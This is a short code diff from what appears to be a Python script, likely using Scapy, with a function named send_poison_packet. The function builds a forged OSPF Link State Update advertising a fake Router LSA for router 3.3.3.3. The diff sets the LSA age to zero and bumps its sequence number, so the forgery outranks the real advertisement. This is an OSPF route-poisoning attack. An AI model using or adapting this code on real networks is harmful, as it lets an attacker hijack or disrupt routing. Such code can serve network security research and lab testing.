@@ -514,9 +514,10 @@ def send_poison_packet(received_packet):
     ospf_update = OSPF_LSUpd(
         lsacount=1, # Number of LSAs in this update
         lsalist=[OSPF_Router_LSA(
+        age=0,
         id="3.3.3.3", 
         adrouter="3.3.3.3", 
-        seq=0x80000099,
+        seq=0x8000009A,
         options=0x22, # 0x22 is Demand Circuits, External Routing
         linklist=[
         OSPF_Link(type=2, id="10.0.0.0", data="255.255.255.0", metric=1),
